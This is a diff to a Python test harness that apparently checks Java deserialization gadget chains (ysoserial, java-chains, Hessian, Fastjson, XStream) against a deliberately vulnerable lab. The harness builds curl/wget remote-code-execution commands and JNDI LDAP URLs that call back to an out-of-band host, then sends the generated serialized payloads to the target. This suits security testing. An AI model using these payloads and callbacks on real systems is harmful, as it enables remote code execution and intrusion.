@@ -35,7 +35,8 @@ C2_WAIT     = int(os.getenv("C2_WAIT",   "25"))    # seconds to wait for C2 agen
 CALLBACK_BASE = f"http://{OOB_HOST}:{OOB_HTTP}/callback/http"
 CURL_CMD = lambda tok: f"curl -sk {CALLBACK_BASE}/{tok}/rce"
 WGET_CMD = lambda tok: f"wget -q -O/dev/null {CALLBACK_BASE}/{tok}/rce"
-EXEC_CMD = lambda tok: f"({CURL_CMD(tok)} || {WGET_CMD(tok)}) &"
+# Use plain curl — Runtime.exec(String) cannot handle shell operators like ()/||/&
+EXEC_CMD = lambda tok: CURL_CMD(tok)
 
 # ── State ─────────────────────────────────────────────────────────────────────
 TOKEN   = None      # JWT
@@ -108,6 +109,8 @@ def ensure_project():
 
 def new_token(label=""):
     s, d = post("/tokens", {"project_id": PROJECT, "label": label or "verify", "intent": "record"})
+    if not isinstance(d, dict) or "token" not in d:
+        raise RuntimeError(f"token creation failed s={s}: {d}")
     return d["token"]
 
 def wait_callback(token, timeout=POLL_SEC):
@@ -219,6 +222,37 @@ KNOWN_SKIP = {
     "jchains_h2_jdbc":          "H2 driver not on target classpath",
     # BlazeDS/Axis2: invalid stream format — needs AMF3 endpoint
     "jchains_blazeds_axis2":    "Requires AMF3/BlazeDS endpoint (not native deser)",
+
+    # java-chains Exec gadget is broken: hardcodes cmd='calc' AND generates a class
+    # that doesn't implement AbstractTranslet.transform() → InstantiationException
+    # from TemplatesImpl.getTransletInstance(). All BytecodeConvert+Exec chains fail.
+    "jchains_native_cc6":          "java-chains Exec bug: cmd hardcoded 'calc', missing transform() impl",
+    "jchains_cc1":                 "java-chains Exec bug: cmd hardcoded 'calc', missing transform() impl",
+    "jchains_cc2":                 "java-chains Exec bug: cmd hardcoded 'calc', missing transform() impl",
+    "jchains_cc3":                 "java-chains Exec bug: cmd hardcoded 'calc', missing transform() impl",
+    "jchains_cc4":                 "java-chains Exec bug: cmd hardcoded 'calc', missing transform() impl",
+    "jchains_cc6":                 "java-chains Exec bug: cmd hardcoded 'calc', missing transform() impl",
+    "jchains_native_cb1":          "java-chains Exec bug: cmd hardcoded 'calc', missing transform() impl",
+    "jchains_native_jackson":      "java-chains Exec bug: cmd hardcoded 'calc', missing transform() impl",
+    "jchains_native_k1_secondary": "java-chains Exec bug: cmd hardcoded 'calc', missing transform() impl",
+    "jchains_native_c3p0_el":      "java-chains Exec bug: cmd hardcoded 'calc' (EL path)",
+    # Hessian exec/bcel/secondary/rome chains — all use BytecodeConvert+Exec (same Exec bug)
+    # Plus Hessian exec gadgets use SwingLazyValue which requires UIDefaults.get() to fire
+    # (not triggered by raw HessianInput.readObject())
+    "jchains_hessian1_exec":      "java-chains Exec bug + SwingLazyValue not triggered by readObject()",
+    "jchains_hessian1_secondary": "java-chains Exec bug + SwingLazyValue not triggered by readObject()",
+    "jchains_hessian1_bcel":      "java-chains Exec bug + SwingLazyValue not triggered by readObject()",
+    "jchains_hessian1_rome1":     "java-chains Exec bug + SwingLazyValue not triggered by readObject()",
+    "jchains_hessian1_rome2":     "java-chains Exec bug + SwingLazyValue not triggered by readObject()",
+    "jchains_hessian2_exec":      "java-chains Exec bug + SwingLazyValue not triggered by readObject()",
+    "jchains_hessian2_secondary": "java-chains Exec bug + SwingLazyValue not triggered by readObject()",
+    "jchains_hessian2_bcel":      "java-chains Exec bug + SwingLazyValue not triggered by readObject()",
+    "jchains_hessian2_rome1":     "java-chains Exec bug + SwingLazyValue not triggered by readObject()",
+    "jchains_hessian2_rome2":     "java-chains Exec bug + SwingLazyValue not triggered by readObject()",
+    "jchains_hessian2_tostring_jackson": "java-chains Exec bug; Jackson toString secondary",
+    "jchains_hessian2_tostring_xbean":   "java-chains Exec bug; Tomcat EL engine absent in vulnlab",
+    # JRMPClient: needs a running JRMPListener to send back a gadget payload
+    "ysoserial_jrmp_client":       "Needs active JRMP listener; no JRMPListener configured",
 }
 
 
@@ -227,7 +261,11 @@ def test_deser_chain(chain_id, params=None):
     if chain_id in KNOWN_SKIP:
         record(chain_id, "SKIP", KNOWN_SKIP[chain_id])
         return
-    tok = new_token(chain_id[:20])
+    try:
+        tok = new_token(chain_id[:20])
+    except Exception as e:
+        record(chain_id, "ERR ", f"token creation failed: {e}")
+        return
     p = {"cmd": EXEC_CMD(tok)}
     if params:
         p.update(params)
@@ -257,11 +295,53 @@ def test_deser_chain(chain_id, params=None):
     else:
         record(chain_id, "FAIL", f"no OOB callback (deser resp={code}: {resp[:60]})")
 
+def test_deser_jndi_chain(chain_id):
+    """For deserialization chains that trigger JNDI (jndi_url param), POST to /deser."""
+    if chain_id in KNOWN_SKIP:
+        record(chain_id, "SKIP", KNOWN_SKIP[chain_id])
+        return
+    try:
+        tok = new_token(chain_id[:20])
+    except Exception as e:
+        record(chain_id, "ERR ", f"token creation failed: {e}")
+        return
+    jndi_url = f"ldap://{OOB_HOST}:{OOB_LDAP}/{tok}/Exp"
+    s, d = generate_payload(chain_id, {"jndi_url": jndi_url})
+    if s != 200:
+        record(chain_id, "ERR ", f"generate failed: {d}")
+        return
+    b64 = d.get("value","") or d.get("payload","")
+    if not b64:
+        record(chain_id, "ERR ", f"no value in response: {list(d.keys())}")
+        return
+    try:
+        raw = base64.b64decode(b64)
+    except Exception:
+        record(chain_id, "ERR ", "payload not valid base64")
+        return
+    if len(raw) < 4:
+        record(chain_id, "ERR ", f"payload too short: {len(raw)} bytes")
+        return
+    code, resp = post_raw(f"{VULNLAB}/deser", raw)
+    if code == 0:
+        record(chain_id, "SKIP", f"vulnlab unreachable: {resp[:80]}")
+        return
+    ok, ev = wait_callback(tok)
+    if ok:
+        record(chain_id, "PASS", f"callback from {ev.get('remote_addr','?')} proto={ev.get('protocol','?')}")
+    else:
+        record(chain_id, "FAIL", f"no OOB callback (deser resp={code}: {resp[:60]})")
+
+
 def test_hessian_chain(chain_id, version=1):
     if chain_id in KNOWN_SKIP:
         record(chain_id, "SKIP", KNOWN_SKIP[chain_id])
         return
-    tok = new_token(chain_id[:20])
+    try:
+        tok = new_token(chain_id[:20])
+    except Exception as e:
+        record(chain_id, "ERR ", f"token creation failed: {e}")
+        return
     jndi_url = f"ldap://{OOB_HOST}:{OOB_LDAP}/{tok}/Exp"
     s, d = generate_payload(chain_id, {"jndi_url": jndi_url, "cmd": EXEC_CMD(tok)})
     if s != 200:
@@ -291,7 +371,11 @@ def test_fastjson_chain(chain_id):
     if chain_id in KNOWN_SKIP:
         record(chain_id, "SKIP", KNOWN_SKIP[chain_id])
         return
-    tok = new_token(chain_id[:20])
+    try:
+        tok = new_token(chain_id[:20])
+    except Exception as e:
+        record(chain_id, "ERR ", f"token creation failed: {e}")
+        return
     jndi_url = f"ldap://{OOB_HOST}:{OOB_LDAP}/{tok}/Exp"
     s, d = generate_payload(chain_id, {"jndi_url": jndi_url, "cmd": EXEC_CMD(tok)})
     if s != 200:
@@ -318,7 +402,14 @@ def test_fastjson_chain(chain_id):
         record(chain_id, "FAIL", f"no callback (resp={code}: {resp[:60]})")
 
 def test_xstream_chain(chain_id):
-    tok = new_token(chain_id[:20])
+    if chain_id in KNOWN_SKIP:
+        record(chain_id, "SKIP", KNOWN_SKIP[chain_id])
+        return
+    try:
+        tok = new_token(chain_id[:20])
+    except Exception as e:
+        record(chain_id, "ERR ", f"token creation failed: {e}")
+        return
     jndi_url = f"ldap://{OOB_HOST}:{OOB_LDAP}/{tok}/Exp"
     s, d = generate_payload(chain_id, {"jndi_url": jndi_url, "cmd": EXEC_CMD(tok)})
     if s != 200:
@@ -706,12 +797,15 @@ def main():
 
     # ── Section 2: jchains native deserialization ──────────────────────────────
     print("\n[*] Section 2: jchains native deserialization (→ /deser)")
-    for cid in ["jchains_native_cc6","jchains_native_cb1","jchains_native_cb1_jndi",
+    for cid in ["jchains_native_cc6","jchains_native_cb1",
                 "jchains_native_cb2","jchains_native_k1_secondary",
                 "jchains_cc1","jchains_cc2","jchains_cc3","jchains_cc4","jchains_cc6",
                 "jchains_native_jackson","jchains_native_jdk17_1","jchains_native_jdk17_2",
-                "jchains_native_c3p0_el","jchains_native_c3p0_ldap"]:
+                "jchains_native_c3p0_el"]:
         test_deser_chain(cid)
+    # CB1 JNDI and C3P0 LDAP need jndi_url param (not cmd)
+    test_deser_jndi_chain("jchains_native_cb1_jndi")
+    test_deser_jndi_chain("jchains_native_c3p0_ldap")
 
     # ── Section 3: Hessian chains ──────────────────────────────────────────────
     print("\n[*] Section 3: Hessian1 chains (→ /hessian)")
